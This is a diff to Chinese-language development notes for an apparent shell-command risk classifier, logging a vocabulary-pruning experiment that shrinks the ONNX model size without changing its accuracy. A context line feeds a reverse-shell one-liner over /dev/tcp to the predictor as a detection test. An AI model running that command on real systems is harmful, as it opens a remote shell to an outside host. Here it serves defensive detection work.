@@ -249,3 +249,12 @@ Demo 表现正常：`df -h`→benign、`systemctl restart nginx`→benign、reve
 
 ### 本地推理
 - `python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"` → risk.malicious + T1059/T1071 等，正常。
+
+## 词表裁剪尝试（保留原结果，已推 GitHub）
+
+- 新增 `model/prune_vocab.py`：edge 模型 token embedding 50,370 → ~10,746（label 描述+命令语料+单字符+特殊 token 闭包），其余映射 `[UNK]`。
+- 精度：剪裁前后 logits **逐点一致（max diff 0.0）**，test 指标不损失。
+- 体积：fp32 ONNX 132MB → **71.6MB**（`final_model_edge_pruned/model_reduced.onnx` + `old_to_new.npy`）。
+- RSS：C 运行时 VmHWM 仍约 **126MB**（ORT 运行时/MatMul 底噪高），未达 <100MB。
+- 结论：词表裁剪=体积减半+零精度损失；但要 RSS<100MB 仍需 QAT 或更小/更易量化基座。
+- 原 `final_model_edge`（32.7M，test overall 0.7836）保持不变；代码/文档已推送到私有仓库 `ohmydevelop/hyperids`。
